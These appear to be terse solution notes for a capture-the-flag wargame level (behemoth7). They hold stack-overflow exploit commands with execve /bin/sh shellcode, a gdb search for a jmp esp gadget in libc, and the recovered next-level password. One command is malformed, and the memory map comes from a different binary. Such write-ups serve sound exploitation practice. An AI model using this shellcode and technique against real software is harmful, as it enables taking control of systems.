./behemoth7 "$(python -c 'print "A" * 512 + "\x20"*44')"

eip: 0x61616165


./behemoth7 "$(python -c 'print "A" * 512 + "B" * 16 + "C" * 4' + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80')"

find jmp esp

(gdb) info proc map
process 5536
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000        0x0 /narnia/narnia2
         0x8049000  0x804a000     0x1000        0x0 /narnia/narnia2
         0x804a000  0x806b000    0x21000        0x0 [heap]
        0xf7e10000 0xf7e12000     0x2000        0x0
        0xf7e12000 0xf7fc3000   0x1b1000        0x0 /lib32/libc-2.24.so
        0xf7fc3000 0xf7fc5000     0x2000   0x1b0000 /lib32/libc-2.24.so
        0xf7fc5000 0xf7fc6000     0x1000   0x1b2000 /lib32/libc-2.24.so
        0xf7fc6000 0xf7fc9000     0x3000        0x0
        0xf7fd2000 0xf7fd4000     0x2000        0x0
        0xf7fd4000 0xf7fd7000     0x3000        0x0 [vvar]
        0xf7fd7000 0xf7fd9000     0x2000        0x0 [vdso]
        0xf7fd9000 0xf7ffc000    0x23000        0x0 /lib32/ld-2.24.so
        0xf7ffc000 0xf7ffd000     0x1000    0x22000 /lib32/ld-2.24.so
        0xf7ffd000 0xf7ffe000     0x1000    0x23000 /lib32/ld-2.24.so
        0xfffdd000 0xffffe000    0x21000        0x0 [stack]
(gdb) find /b 0xf7fc3000, 0xf7fc5000, 0xff, 0xe4
0xf7fc4f97
1 pattern found.
(gdb) x/wx 0xf7fc4f97
0xf7fc4f97:     0xfc5be4ff

jmp esp: 0xf7fc4f97

./behemoth7 "$(python -c 'print "A" * 512 + "B" * 16 + "\x97\x4f\xfc\xf7" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"')"

behemoth8:pheewij7Ae
